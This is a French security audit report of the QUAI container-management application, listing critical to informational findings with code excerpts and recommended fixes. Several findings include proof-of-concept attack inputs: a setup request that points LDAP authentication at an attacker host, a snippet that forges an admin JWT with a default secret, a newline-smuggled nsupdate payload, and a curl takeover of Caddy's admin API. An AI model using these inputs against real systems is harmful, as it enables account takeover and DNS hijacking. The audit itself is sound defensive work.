# Audit de sécurité QUAI — 2026-08-12

Périmètre : `apps/api` (Fastify/TypeScript), `apps/web` (React/Redux), `deploy/docker`, `deploy/compose`. Audit en lecture seule (aucun fichier source applicatif modifié, aucune commande destructive lancée, aucun conteneur `quai-dev-*` touché).

Méthode : lecture directe du code réel (fichiers cités avec numéros de ligne), complétée par trois agents d'exploration READ-ONLY dédiés à (1) l'usage de `child_process`, (2) le contrôle d'accès par rôle sur les routes, (3) le frontend/Docker/Caddy/dépendances. Chaque finding a été vérifié par citation de code exacte ; les hypothèses non confirmables sans test réseau/live sont explicitement marquées « à confirmer ».

## Résumé exécutif

| Sévérité | Nombre |
|---|---|
| Critique | 3 |
| Élevée | 4 |
| Moyenne | 6 |
| Faible | 4 |
| Info | 3 |

Les trois findings critiques permettent, séparément : (1) une prise de contrôle admin totale de l'instance en profitant de la fenêtre de reconfiguration de l'assistant de setup ; (2) la forge de session admin si `JWT_SECRET` n'est pas positionné en production (aucune vérification ne l'impose, contrairement à `CONFIG_ENCRYPTION_KEY`) ; (3) une injection de commandes dans le protocole `nsupdate` via le champ `subdomain` du reverse proxy, permettant à un simple `operator` de réécrire des enregistrements DNS arbitraires dans la zone Active Directory de la mairie.

---

## Findings — Critique

### C1 — Bypass total de l'authentification pendant la fenêtre de reconfiguration (`POST /api/setup/reset` → `POST /api/setup/complete`)

**Fichiers** : `apps/api/src/plugins/auth.ts:73-86`, `apps/api/src/routes/setup.ts:60-141`, `apps/api/src/services/setupStore.ts` (`resetSetup` L221-227, `completeSetup` L212-218).

**Description** : le hook d'authentification global n'exige **aucune session** pour tout `/api/setup/*` tant que `completed=false` :

```ts
// apps/api/src/plugins/auth.ts:73-75
if (pathname.startsWith("/api/setup/")) {
  const completed = await isSetupCompleted();
  if (!completed) return; // assistant en cours : ouvert, aucune session requise
```

Ce comportement est nécessaire au tout premier démarrage (bootstrap). Le problème est que `completed` redevient `false` chaque fois qu'un admin légitime appelle `POST /api/setup/reset` pour rouvrir l'assistant (fonctionnalité documentée dans ARCHITECTURE.md : « Un utilisateur admin déjà authentifié peut rouvrir cet assistant... l'app reste accessible en lecture pendant la reconfiguration »). Pendant toute cette fenêtre, **`POST /api/setup/complete` est lui aussi ouvert sans authentification** (`routes/setup.ts:125-135`) et accepte n'importe quelle configuration candidate, y compris LDAP :

```ts
// apps/api/src/routes/setup.ts:125-135
fastify.post<{ Body: SetupCandidate }>("/api/setup/complete", async (request, reply) => {
  const candidate = request.body;
  if (!candidate?.ldap) {
    return reply.code(400).send({ error: "ldap configuration is required to complete setup" });
  }
  const saved = await completeSetup(candidate);
  return reply.send(saved);
});
```

`completeSetup()` ne vérifie ni l'identité de l'appelant ni que la configuration provient du même admin qui a déclenché le reset — elle écrit simplement la config fournie et marque `completed:true`.

**Scénario d'exploitation concret** :
1. Un admin légitime clique « Reconfigurer » dans Paramètres (`POST /api/setup/reset`), par exemple pour changer un registry.
2. Pendant la fenêtre où `completed=false` (aucune limite de temps ni verrou), un attaquant ayant simplement accès réseau à l'API (pas de compte QUAI) envoie :
   ```json
   POST /api/setup/complete
   {
     "ldap": {
       "url": "ldap://attacker.example:389",
       "bindDn": "cn=x", "bindPassword": "x",
       "searchBase": "dc=x", "searchFilter": "(uid={{username}})",
       "groupRoleMap": {},
       "defaultRole": "admin"
     }
   }
   ```
3. QUAI persiste cette config et repasse `completed:true`. `defaultRole: "admin"` fait que **tout bind réussi** (contre le faux serveur LDAP de l'attaquant, qu'il contrôle entièrement) reçoit le rôle `admin`.
4. L'attaquant appelle `POST /api/auth/login` avec n'importe quel couple username/password — son propre serveur LDAP répond « bind OK » — et reçoit un cookie de session JWT avec le rôle `admin`.
5. Accès admin complet à QUAI : conteneurs, secrets (`POST /api/secrets/:id/reveal`), environnements Docker distants, gestion des accès.

Le même trou expose aussi, sans authentification pendant cette fenêtre, `POST /api/setup/test/docker|kubernetes|nutanix|registry|ldap` avec une URL/hôte arbitraire fourni par l'appelant — voir C3-bis en Élevée (SSRF).

**Correctif recommandé** : ne jamais rouvrir l'accès anonyme après le tout premier démarrage. Par exemple, distinguer « jamais configuré » (`config.json` absent) de « en cours de reconfiguration » (reset explicite) : dans le second cas, exiger toujours une session `admin` valide sur `/api/setup/*` (y compris `complete`), et/ou générer un jeton de reconfiguration à usage unique côté `POST /api/setup/reset` que `POST /api/setup/complete` doit revalider.

---

### C2 — `JWT_SECRET` non imposé en production : forge de session admin possible

**Fichiers** : `apps/api/src/config.ts:69`, `apps/api/src/services/session.ts:23-41`, `apps/api/src/services/crypto.ts:42-66` (pour comparaison), `apps/api/.env.example:12-13`.

**Description** : `CONFIG_ENCRYPTION_KEY` a un garde-fou explicite qui **refuse de démarrer en production** si la variable est absente (`crypto.ts:51-56`). Aucun garde équivalent n'existe pour `JWT_SECRET` :

```ts
// apps/api/src/config.ts:69
jwtSecret: readString("JWT_SECRET", "dev-insecure-secret-change-me"),
```

Cette valeur par défaut est un secret **connu publiquement** (committé dans le dépôt, dans `.env.example`). `session.ts` l'utilise directement pour signer/vérifier tous les JWT de session (`jwt.sign(payload, config.session.jwtSecret, ...)`), sans jamais vérifier qu'elle a été surchargée.

**Scénario d'exploitation concret** : si un déploiement en production oublie de positionner `JWT_SECRET` (erreur humaine plausible — rien dans le code ni au démarrage ne l'empêche ni ne l'avertit, contrairement à `CONFIG_ENCRYPTION_KEY` qui, lui, throw une erreur explicite), n'importe qui connaissant la chaîne `dev-insecure-secret-change-me` (visible dans ce dépôt public/`.env.example`) peut forger localement un JWT HS256 valide :

```js
require("jsonwebtoken").sign(
  { username: "attacker", displayName: "x", roles: ["admin"] },
  "dev-insecure-secret-change-me",
  { expiresIn: "7d" }
);
```
puis le poser comme cookie `quai_session` pour obtenir un accès admin complet, sans jamais toucher LDAP.

**Correctif recommandé** : appliquer à `JWT_SECRET` exactement le même garde que `CONFIG_ENCRYPTION_KEY` — refuser de démarrer (`process.exit(1)` ou `throw` avant `fastify.listen`) si `NODE_ENV=production` et `JWT_SECRET` absent ou égal à la valeur par défaut documentée.

---

### C3 — Injection dans le protocole `nsupdate` via `subdomain` (reverse proxy → DNS Active Directory)

**Fichiers** : `apps/api/src/routes/reverseProxy.ts:55-63`, `apps/api/src/services/reverseProxy.ts:153-155` (`normalizeSubdomain`) et `:163-197` (`createRoute`), `apps/api/src/services/adDns.ts:166` (`nsupdate`) et `:210-228` (`pushDnsRecord`).

**Description** : la création d'une route de reverse proxy (`POST /api/reverse-proxy/routes`, rôle `operator`/`admin` suffisant — aucune restriction supplémentaire, cf. commentaire d'en-tête de `routes/reverseProxy.ts:6`) accepte un champ `subdomain` **sans aucune validation de caractères** :

```ts
// apps/api/src/routes/reverseProxy.ts:56-62
const subdomain = request.body?.subdomain?.trim();
...
if (!subdomain) {
  return reply.code(400).send({ error: "subdomain is required" });
}
```
```ts
// apps/api/src/services/reverseProxy.ts:153-155
function normalizeSubdomain(raw: string): string {
  return raw.trim().toLowerCase();
}
```

Quand l'intégration DNS Active Directory est configurée (`services/adDns.ts`), `createRoute()` transmet ce `subdomain` tel quel à `pushDnsRecord()`, qui l'interpole directement dans un script texte envoyé sur le **stdin** de `nsupdate -g` :

```ts
// apps/api/src/services/adDns.ts:216-220
const name = fqdn(subdomain);
const update = await nsupdate(cfg, work, [
  `update delete ${name} A`,
  `update add ${name} ${config.adDns.recordTtlSeconds} A ${cfg.targetIp}`,
]);
```
```ts
// apps/api/src/services/adDns.ts:166
const script = [`server ${cfg.kdcHost}`, `zone ${cfg.zone}`, ...scriptLines, "send", ""].join("\n");
```

`nsupdate` interprète son entrée comme une suite de commandes séparées par des retours à la ligne. Comme `subdomain` peut contenir `\n` (JSON body, aucun filtrage), un utilisateur `operator` peut injecter des lignes de commande `nsupdate` supplémentaires.

**Scénario d'exploitation concret** : un `operator` (rôle non-admin) envoie :
```json
POST /api/reverse-proxy/routes
{
  "subdomain": "x.lecreusot.priv\nupdate add admin-portal.lecreusot.priv. 300 A 6.6.6.6\nsend\nupdate delete x",
  "targetHost": "10.0.0.1",
  "targetPort": 80
}
```
Le script `nsupdate` résultant contient une commande `update add` non prévue, permettant de réécrire l'enregistrement A d'un **nom arbitraire de la zone** (ex. usurper `admin-portal.lecreusot.priv`, ou un service interne existant) — avec les droits Kerberos GSS-TSIG réels du compte de service configuré, qui dispose du droit « Dynamic Update » sur toute la zone AD de la mairie. C'est une élévation de capacité : un `operator` ne devrait pouvoir écrire que le sous-domaine de *sa propre* route, pas n'importe quel enregistrement DNS de l'annuaire Active Directory de la ville.

**Correctif recommandé** : valider `subdomain` avec une regex stricte de nom de domaine (`^[a-z0-9]([a-z0-9-]*[a-z0-9])?(\.[a-z0-9]([a-z0-9-]*[a-z0-9])?)*$`), rejetant explicitement tout `\n`/`\r`/espace, avant `normalizeSubdomain()` — aussi bien côté route que côté service (défense en profondeur). Appliquer la même validation à `targetIp` dans `services/setupStore.ts#SetupAdDnsConfig`/`routes/adDns.ts` (actuellement seulement vérifié « non vide », voir finding M6).

---

## Findings — Élevée

### E1 — `GET /api/containers/:id` expose en clair la valeur d'un secret résolu via `secretEnv`, à tout rôle (y compris `viewer`)

**Fichiers** : `apps/api/src/routes/containers.ts:164-170` (route), `:106-134` (résolution `secretEnv`), `apps/api/src/services/docker.ts:610` (`inspectDockerContainer`).

**Description** : `POST /api/containers` résout chaque entrée `secretEnv` en clair côté serveur puis l'injecte dans l'`Env` réel du conteneur Docker :

```ts
// apps/api/src/routes/containers.ts:122,132,141
value = await getDecryptedSecretValue(secretName);
...
secretEnv.push(`${key}=${value}`);
...
env: [...env, ...secretEnv],
```

`GET /api/containers/:id` (aucune restriction de rôle au-delà du hook global — GET n'est pas une méthode mutante) renvoie l'inspection Docker complète, y compris `Config.Env` **sans aucune rédaction** :

```ts
// apps/api/src/services/docker.ts:610
env: data.Config?.Env ?? [],
```

**Scénario d'exploitation concret** : un utilisateur `viewer` (lecture seule, censé n'avoir accès à aucun secret d'après ARCHITECTURE.md — « write-only côté API ... aucune route ne l'expose jamais, sous aucune forme ») appelle `GET /api/containers/<id>` sur un conteneur créé avec `secretEnv` et lit directement `DB_PASSWORD=...` (ou équivalent) en clair dans la réponse JSON — sans jamais passer par `POST /api/secrets/:id/reveal` (qui, lui, est bien verrouillé `admin`). Ceci contredit directement le contrat de sécurité documenté du gestionnaire de secrets.

**Correctif recommandé** : soit masquer `Config.Env` (ou uniquement les entrées connues comme provenant de `secretEnv`, via `usedBy`/mapping clé) dans la réponse de `GET /api/containers/:id` pour les rôles non-admin, soit restreindre cette route à `operator`/`admin` au minimum et documenter le compromis, soit — solution la plus propre — ne jamais fusionner les valeurs de secret dans l'`Env` visible par `docker inspect` mais utiliser un mécanisme Docker qui ne les expose pas via l'API d'inspection (ex. Docker secrets/bind-mount de fichier, hors périmètre du premier lot mais à envisager).

---

### E2 — `workspaceId` non validé dans le module IaC : risque d'évasion du sandbox de fichiers / cwd du sous-processus

**Fichiers** : `apps/api/src/services/iac/workspaces.ts:24-26` (`workspaceFilesPath`), `:180-187` (`resolveSafeFilePath`), `apps/api/src/services/iac/runner.ts:104-132` (`startRun`), `apps/api/src/routes/iac.ts:57-114` (aucune vérification `getWorkspace(id)` avant usage).

**Description** : `workspaceFilesPath(workspaceId)` construit un chemin par simple concaténation :

```ts
// apps/api/src/services/iac/workspaces.ts:24-26
export function workspaceFilesPath(workspaceId: string): string {
  return path.join(iacRootPath(), workspaceId, "files");
}
```

`workspaceId` provient directement de `request.params.id` (`routes/iac.ts`), **sans jamais être validé** (ni whitelist de caractères, ni vérification que l'id existe réellement dans l'index `workspaces.json` via `getWorkspace()`). Ce chemin sert ensuite de :
- base pour `resolveSafeFilePath()` (`workspaces.ts:180-187`), qui protège correctement `relativePath` **par rapport à cette base** — mais jamais la base elle-même ;
- `cwd` du sous-processus `tofu`/`ansible-playbook`/`packer` lancé par `startRun()` (`runner.ts:109-132`).

Contrairement à l'équivalent pour les volumes Docker (`docker.ts:737-754`, `assertValidVolumeName`/`resolveVolumeSubPath`, qui valident strictement le nom avant tout usage), aucune fonction analogue n'existe pour `workspaceId`.

**Scénario d'exploitation (partiellement confirmé, exploitabilité réseau non testée en live)** : si le routeur Fastify (`find-my-way`, via `fastify@^4.28.1`) décode une séquence encodée telle que `%2e%2e%2f` en un caractère `/` **à l'intérieur** de la valeur du paramètre `:id` (comportement qui dépend de la version/configuration du routeur et n'a pas été vérifié en conditions réelles dans le cadre de cet audit, aucun test réseau n'ayant été effectué), un `operator`/`admin` pourrait faire pointer `workspaceDir` hors de `data/iac/` via `PUT /api/iac/workspaces/<id-malicieux>/files/<path>` (écriture) ou `GET .../files/<path>` (lecture), voire faire tourner `tofu`/`ansible`/`packer` avec un `cwd` arbitraire. Même sans confirmation de l'exploitabilité exacte via encodage d'URL, l'absence de toute validation est un défaut de code réel et incohérent avec le reste du projet (qui applique ce contrôle ailleurs pour un cas analogue).

**Correctif recommandé** : valider `workspaceId` comme UUID strict (`/^[0-9a-f-]{36}$/`) avant tout usage, et/ou appeler systématiquement `getWorkspace(id)` (404 si absent de l'index) avant toute opération fichier ou tout `spawn`.

---

### E3 — Reconfiguration de l'intégration DNS AD (`PUT /api/ad-dns/config`) accessible à un simple `operator`

**Fichiers** : `apps/api/src/routes/adDns.ts:53-74` (aucun `rejectIfNotAdmin`), comparer avec `routes/secrets.ts`, `routes/remoteEnvironments.ts`, `routes/lxc.ts` (tous `admin`-only pour des intégrations de sensibilité comparable).

**Description** : `PUT /api/ad-dns/config` permet de changer `kdcHost`, `realm`, `zone`, `serviceAccount`, `targetIp` — avec seulement le rôle `operator`/`admin` exigé par le hook global, sans restriction `admin` explicite comme pour les autres intégrations à privilège élevé du projet (secrets, environnements Docker distants, LXC).

**Scénario d'exploitation concret** : un `operator` change `kdcHost` pour pointer vers un KDC Kerberos qu'il contrôle (en conservant le mot de passe déjà enregistré, via l'omission du champ `password` — « conserve le mot de passe déjà enregistré »). Au prochain `pushDnsRecord()` (déclenché par la création d'une route de reverse proxy), `kinit` envoie une requête AS-REQ authentifiée par mot de passe vers ce faux KDC — une attaque classique de type rogue-KDC permet de capturer du matériel cryptographique exploitable pour une attaque hors-ligne sur le mot de passe du compte de service AD, ou simplement de faire échouer silencieusement toute synchronisation DNS légitime en la redirigeant.

**Correctif recommandé** : restreindre `PUT`/`DELETE /api/ad-dns/config` au rôle `admin` explicite (`rejectIfNotAdmin`), au même niveau que `remote-environments`/`lxc`/`secrets` — et ajouter cette route à l'inventaire d'ARCHITECTURE.md (absente actuellement, voir finding F2).

---

### E4 — Jeton GitHub/Git (PAT) transmis en argument de ligne de commande à `git clone`

**Fichiers** : `apps/api/src/services/github.ts:335-343`, `apps/api/src/services/gitops.ts:104-109` et `:207`.

**Description** : les deux intégrations Git du projet construisent une URL de clone contenant le jeton en clair puis la passent à `simple-git`, qui exécute `git clone <url> <dir>` en sous-processus :

```ts
// apps/api/src/services/github.ts:335-343
const cloneUrl = token
  ? `https://x-access-token:${encodeURIComponent(token)}@github.com/${owner}/${repo}.git`
  : `https://github.com/${owner}/${repo}.git`;
...
await withTimeout(
  simpleGit().clone(cloneUrl, cloneDir, ["--depth", "1", "--branch", ref, "--single-branch"]),
  ...
);
```
```ts
// apps/api/src/services/gitops.ts:104-109
if (!gitToken || !repoUrl.startsWith("https://")) return repoUrl;
...
return `https://${user}:${encodeURIComponent(gitToken)}@${withoutProtocol}`;
```

`cloneUrl` devient un argument positionnel du processus `git` réellement lancé — visible via `ps aux`/`/proc/<pid>/cmdline` pendant toute la durée du clone, par tout utilisateur/processus disposant de ces droits d'observation locale sur l'hôte/le conteneur API. Point positif noté : le message journalisé dans le log de déploiement (`github.ts:338`) n'inclut pas le token — seule l'exposition via la table des process est en cause.

**Correctif recommandé** : ne jamais placer le jeton dans l'URL passée à `git`. Utiliser un `credential.helper` temporaire, ou l'option `-c http.extraHeader="Authorization: Basic <base64>"` passée via `simple-git().env(...)`/`.addConfig(...)`, qui n'apparaît pas dans l'argv du process `git` de la même façon (à vérifier que la lib ne la restitue pas non plus en clair dans les args — au minimum, cette approche évite le cas le plus visible, l'URL complète avec token en clair dans `ps`).

---

## Findings — Moyenne

### M1 — Reverse proxy : `targetHost` arbitraire (SSRF interne via Caddy)

**Fichiers** : `apps/api/src/services/reverseProxy.ts` (`CreateRouteInput.targetHost`, `resolveUpstream` L247-254), `apps/api/src/routes/reverseProxy.ts:55-88` (aucune restriction au-delà d'operator/admin).

**Description** : `POST /api/reverse-proxy/routes` accepte un `targetHost`/`targetPort` totalement libres (documenté dans ARCHITECTURE.md comme « cas générique, hors conteneurs QUAI »). N'importe quel `operator` peut donc router un sous-domaine `*.lecreusot.priv`, servi par Caddy sur les ports **80/443 publiés à l'hôte** (`docker-compose.dev.yml`), vers n'importe quel service interne (ex. une API d'administration interne non censée être exposée publiquement, l'admin API Caddy elle-même à `caddy:2019`, ou un service sur un VLAN accessible depuis le réseau Docker). C'est une fonctionnalité assumée par conception (reverse proxy générique), mais elle constitue une surface SSRF réelle dès qu'un compte `operator` (rôle intermédiaire, pas le plus privilégié) est compromis ou malveillant.

**Correctif recommandé** : envisager une liste blanche de plages IP internes autorisées comme cible (ou au minimum interdire les adresses de loopback/liens locaux/l'IP du service Caddy lui-même), ou restreindre `targetHost` au rôle `admin`.

### M2 — API d'administration Caddy sans authentification réelle sur le réseau Docker

**Fichiers** : `apps/api/src/services/reverseProxy.ts:302-313` (`admin.origins`), `deploy/compose/caddy/Caddyfile:9-18`, `deploy/compose/docker-compose.dev.yml` (port `2019` non publié à l'hôte — vérifié correct).

**Description** : la seule protection de l'API d'admin Caddy (`:2019`, `0.0.0.0` à l'intérieur du conteneur) est une liste blanche sur l'en-tête `Origin`/`Host` (`admin.origins`) — un contrôle anti-CSRF pensé pour des requêtes émises par un navigateur, pas une authentification. Un appel serveur-à-serveur direct (`curl -H "Origin: http://caddy:2019" http://caddy:2019/load -d '{...}'`) depuis n'importe quel autre conteneur du réseau `quai-dev` suffit à en prendre le contrôle total (reconfiguration complète du routage HTTP/HTTPS, y compris vers des cibles arbitraires). Le port n'est pas publié à l'hôte (vérifié dans `docker-compose.dev.yml`), donc le risque est limité à un mouvement latéral **depuis un autre conteneur déjà compromis** du même réseau — mais aucune barrière supplémentaire n'existe à l'intérieur de ce réseau.

**Correctif recommandé** : documenter ce risque de mouvement latéral comme accepté (dépendant entièrement de la segmentation réseau), ou ajouter une couche d'authentification devant `:2019` (ex. certificat client mTLS entre `api` et `caddy`, ou un jeton partagé vérifié par un petit proxy).

### M3 — Absence de timeout sur les sous-processus IaC (`tofu`/`ansible-playbook`/`packer`) et sur les scanners (`grype`/`osv-scanner`)

**Fichiers** : `apps/api/src/services/iac/runner.ts:129-132` (`spawn`, aucun `setTimeout`/`kill`), `apps/api/src/services/scan.ts:383-387` (`execFile`, pas d'option `timeout`).

**Description** : contrairement à `services/adDns.ts` (qui a un `setTimeout(() => child.kill("SIGKILL"), timeoutMs)` explicite), aucun mécanisme de coupure n'existe pour les runs IaC ni pour les scans de vulnérabilités. Un `tofu apply`/`ansible-playbook` qui bloque (attente réseau, provisioner qui hang) ou un scan Grype/OSV-Scanner dont le téléchargement de base de données ne se termine jamais peuvent tourner indéfiniment, sans qu'aucune route d'annulation n'existe pour `iac.ts`. Accumulation possible de process/ressources.

**Correctif recommandé** : ajouter un timeout configurable avec `SIGTERM` puis `SIGKILL` après un délai de grâce sur les deux mécanismes, et une route d'annulation pour les runs IaC en cours.

### M4 — `PATCH /api/registries/:id` et `POST /api/registries` accessibles à `operator` alors que documentés « admin uniquement »

**Fichiers** : `apps/api/src/routes/registries.ts:42-52,62-78` (aucun `rejectIfNotAdmin`), comparer avec ARCHITECTURE.md ligne 304 (« admin : + gestion des registries et des accès ») et la référence à l'icône engrenage « admin uniquement » sur `RegistriesPage.tsx`.

**Description** : le hook global (`operator`/`admin`) est la seule protection appliquée. Un `operator` peut donc aujourd'hui créer un registry ou **réécrire les identifiants** (`username`/`password`/`token`) d'un registry existant via `PATCH`, ce que la documentation du projet réserve explicitement à `admin`.

**Correctif recommandé** : ajouter `rejectIfNotAdmin` (même pattern que `secrets.ts`/`remoteEnvironments.ts`) sur `POST /api/registries` et `PATCH /api/registries/:id`.

### M5 — `GET /api/setup/status` expose `username` en clair et `password`/`token` chiffrés de tous les registries, à tout rôle authentifié

**Fichiers** : `apps/api/src/routes/setup.ts:61-71`.

**Description** : cette route est l'unique exception au rôle `admin` sur `/api/setup/*` une fois `completed=true` (elle n'exige qu'une session valide, quel que soit le rôle — `plugins/auth.ts:77-81`), justifiée par le commentaire « ne renvoie que `{ completed, ...booléens }`, aucun secret ». Le code contredit ce commentaire : tous les champs `xConfigured` sont bien réduits à un booléen, **sauf** `registries`, renvoyé sous sa forme brute complète (`current.registries ?? []`), incluant `username` en clair et `password`/`token` sous forme chiffrée (`enc:v1:...`) mais bien présents dans la réponse JSON — alors que `GET /api/registries` (la route dédiée) filtre correctement ces champs via `registriesStore.ts#buildRegistryView`.

**Correctif recommandé** : remplacer `registries: current.registries ?? []` par `registriesConfigured: (current.registries?.length ?? 0) > 0` (ou un résumé sans `username`/`password`/`token`), cohérent avec le traitement des autres champs de cette même route.

### M6 — `targetIp` (config DNS AD) non validé comme adresse IP

**Fichiers** : `apps/api/src/routes/adDns.ts:33-42` (`missingFields`, vérifie seulement la non-vacuité).

**Description** : même mécanisme d'injection que C3, mais côté `targetIp`, configuré uniquement par un rôle `operator`/`admin` (voir E3) au lieu d'un input par route non filtré — sévérité moindre car il faut déjà avoir accès à la configuration DNS AD, mais absence de validation de format incohérente avec le reste du projet.

**Correctif recommandé** : valider `targetIp` avec une regex IPv4/IPv6 stricte avant tout usage dans `pushDnsRecord`.

---

## Findings — Faible

### F1 — `ldapjs@3.0.7` est un paquet officiellement décommissionné

**Fichier** : `apps/api/package.json` (`ldapjs: ^3.0.7`), confirmé par la métadonnée `deprecated` du registre npm capturée dans `pnpm-lock.yaml`.

**Description** : composant critique de l'authentification (bind LDAP), sans garantie de correctifs de sécurité futurs. Aucune CVE précise n'est affirmée ici (à vérifier via `pnpm audit`), mais la dépréciation elle-même est un fait vérifié dans le lockfile.

**Correctif recommandé** : planifier une migration vers un fork maintenu (`@ldapjs/*` apparaît déjà comme sous-dépendance dans le lockfile) ou une alternative activement maintenue.

### F2 — `/api/ad-dns/*` absent de l'inventaire de routes d'ARCHITECTURE.md

**Fichier** : `ARCHITECTURE.md` (section « Routes API »), à comparer avec `apps/api/src/routes/adDns.ts`.

**Description** : toutes les autres intégrations sensibles (secrets, remote-environments, lxc, reverse-proxy, github) sont listées avec leur règle de rôle exacte ; `/api/ad-dns/*` ne l'est pas, ce qui a probablement contribué à l'incohérence de rôle du finding E3.

**Correctif recommandé** : documenter ces routes et leur règle de rôle voulue.

### F3 — Secrets en clair dans `docker-compose.dev.yml`

**Fichier** : `deploy/compose/docker-compose.dev.yml:55` (`LDAP_BIND_PASSWORD: admin`), `:64` (`CONFIG_ENCRYPTION_KEY` fixe committée), `:141` (`LDAP_ADMIN_PASSWORD: admin`), `:142` (`LDAP_TLS: "false"` + port 389 publié à l'hôte).

**Description** : acceptable pour un environnement de dev strictement local (déjà commenté comme tel dans le fichier), mais aucun garde-fou technique n'empêche une réutilisation accidentelle de ce compose tel quel dans un contexte partagé/prod.

**Correctif recommandé** : rendre `CONFIG_ENCRYPTION_KEY` et les mots de passe obligatoires via une syntaxe `${VAR:?missing}` plutôt que des valeurs en dur, pour qu'une réutilisation sans configuration explicite échoue bruyamment.

### F4 — Socket Docker monté en lecture-écriture dans le conteneur `api`

**Fichier** : `deploy/compose/docker-compose.dev.yml:47` (`/var/run/docker.sock:/var/run/docker.sock`).

**Description** : équivalent root sur l'hôte Docker — nécessaire à la fonction même de l'outil (pilotage Docker via dockerode), donc pas une erreur de configuration, mais un point à documenter clairement pour tout déploiement partagé (isolation réseau du conteneur `api`, éventuellement un proxy socket restrictif type `docker-socket-proxy` si toutes les capacités dockerode ne sont pas nécessaires).

---

## Findings — Info

### I1 — `NUTANIX_TLS_REJECT_UNAUTHORIZED`/`LXC_TLS_REJECT_UNAUTHORIZED` à `false` par défaut

**Fichiers** : `apps/api/src/config.ts:97,145`. Comportement documenté et intentionnel (certificats auto-signés fréquents en on-prem), mais à rappeler comme un risque MITM sur un réseau non fiable — recommandation de le passer à `true` dès qu'une CA interne de confiance est en place.

### I2 — Dépendance implicite à `NODE_ENV=production` positionné correctement

**Fichiers** : `apps/api/src/services/crypto.ts:51`, et C2 ci-dessus. Si un opérateur oublie `NODE_ENV=production` en déploiement réel, **tous** les gardes de sécurité qui en dépendent (chiffrement des secrets, et idéalement `JWT_SECRET` après correction de C2) retombent silencieusement sur des valeurs de développement. Recommandation : détecter ce cas autrement qu'en se fiant uniquement à `NODE_ENV` (ex. variable dédiée `QUAI_ALLOW_INSECURE_DEV=1` explicite pour autoriser le mode dégradé, plutôt que l'absence de `NODE_ENV=production`).

### I3 — `signRefreshToken` non utilisé (code mort)

**Fichier** : `apps/api/src/services/session.ts:27-29`. La fonction existe et est documentée (JWT de refresh 7 jours) mais n'est appelée par aucune route — `POST /api/auth/login` ne pose qu'un seul cookie de session (15 min par défaut, `signSessionToken`), sans mécanisme de renouvellement. Pas un problème de sécurité en soi (une session expirée force juste une reconnexion), mais un écart avec ARCHITECTURE.md qui documente un flux de refresh non implémenté.

---

## Vérifié, non problématique (faux positifs écartés)

- **Path traversal sur l'explorateur de fichiers de volume** (`apps/api/src/services/docker.ts:737-754`, `resolveVolumeSubPath`/`assertValidVolumeName`) — triple protection vérifiée dans le code réel : liste blanche de caractères, résolution POSIX + vérification de préfixe, valeur passée en argument positionnel (`$1`) d'un script shell fixe (jamais interpolée). `path=../../etc` est bien rejeté en 400 avant tout appel Docker.
- **Path traversal sur les fichiers de workspace IaC** (`relativePath` uniquement, via `resolveSafeFilePath`, `iac/workspaces.ts:180-187`) — correctement borné par rapport à sa base. Seule la base elle-même (`workspaceId`) n'est pas validée, voir E2.
- **Mot de passe Kerberos jamais en argument de ligne de commande** (`apps/api/src/services/adDns.ts:127-152`, `kinit`) — transmis sur stdin, jamais dans `args[]`, avec timeout + `SIGKILL`. Bon pattern, à ne pas régresser.
- **Sous-processus IaC (OpenTofu/Ansible/Packer)** — `services/iac/runner.ts#buildCommand` : `action`/`engine` passent par un `switch`/liste blanche (`ENGINE_ACTIONS`) produisant des tableaux d'arguments fixes, jamais de shell, jamais d'interpolation de texte utilisateur dans une commande. Pas d'injection de commande possible (voir cependant E2 pour le `cwd` non validé, et M3 pour l'absence de timeout).
- **Scanners Grype/OSV-Scanner** (`services/scan.ts`) — `execFile` (pas `exec`), arguments en tableau, `imageReference` dérivé de données Docker réelles (pas un champ texte libre du body). Injection shell impossible ; seul un risque théorique et mineur d'argument-flag-injection subsiste (mentionné, non retenu comme finding séparé faute d'impact réel démontré).
- **`GET /api/secrets`, `POST/PATCH/DELETE /api/secrets/*`, `POST /api/secrets/:id/reveal`** — vérifiés admin-only via `rejectIfNotAdmin` explicite, cohérent avec ARCHITECTURE.md. `GET /api/secrets` ne renvoie jamais `value` (type `SecretRef`).
- **`GET /api/remote-environments`, `GET /api/lxc/config`** — vérifiés : ne renvoient jamais `ca`/`cert`/`key`/`password`/`privateKey`/`clientCert`/`clientKey`, seulement des booléens de présence (`hasTls`, `hasSshCredentials`) ou l'endpoint. Mutations bien admin-only.
- **`GET /api/registries`** (liste/détail) — vérifié : `registriesStore.ts#buildRegistryView` exclut bien `password`/`token` (contrairement à `GET /api/setup/status`, voir M5).
- **Frontend (`apps/web/src`)** — aucun `dangerouslySetInnerHTML`/`innerHTML` trouvé (0 occurrence). Aucun secret en `localStorage`/`sessionStorage`/state Redux persistant : la valeur révélée d'un secret (`POST /api/secrets/:id/reveal`) n'est volontairement jamais ajoutée au state Redux global (absente des `extraReducers` de `secretsSlice.ts`), gardée en `useState` local avec auto-masquage après 20s. Aucun décodage JWT côté client ; la session est reconstruite à chaque chargement via `GET /api/session` (cookie httpOnly), jamais mise en cache côté client au-delà du state en mémoire.
- **Dockerfiles de production** (`deploy/docker/Dockerfile.api`, `Dockerfile.web`) — utilisateur non-root effectif (`USER node`/`USER nginx`), `COPY --chown`, ports non privilégiés. Aucun secret copié en dur dans l'image.
- **Console interactive conteneur (WebSocket)** (`apps/api/src/routes/console.ts`) — hook `preHandler` local vérifié : exige explicitement `operator`/`admin` **avant** d'accepter l'upgrade WebSocket (une requête d'upgrade est un `GET`, donc non couverte par le contrôle mutant du hook global) ; renforce la protection, ne la contourne pas.
- **Hook d'authentification global — recherche de contournement** — aucune route avec `config: {}` désactivant un hook, aucun usage de `request.raw` dans les routes, aucun préfixe hors `/api/*`, aucun autre `addHook` local que celui de `console.ts` (renforcement) et `plugins/audit.ts` (journalisation post-hoc, ne bypasse rien).
- **CORS** (`apps/api/src/index.ts:56-60`) — `origin` est une liste explicite dérivée de `CORS_ORIGIN` (pas de réflexion dynamique de l'en-tête `Origin` de la requête), donc pas de risque de contournement même avec `credentials: true`.
- **Registries HTTP clients** (`services/registries/http.ts`) — timeout systématique via `AbortController`, pas de `rejectUnauthorized: false` en dur.

---

## Points à vérifier manuellement (non confirmables dans le cadre de cet audit hors-ligne)

- **CVE précises** sur `fastify@4.29.1`, `@kubernetes/client-node@0.21.0`, `ssh2@1.17.0`, `vite@5.4.21`, `jsonwebtoken@9.0.3`, `dockerode@4.0.12` — aucun accès réseau disponible ; exécuter `pnpm audit` (racine + `apps/api` + `apps/web`) pour une liste exhaustive et sourcée.
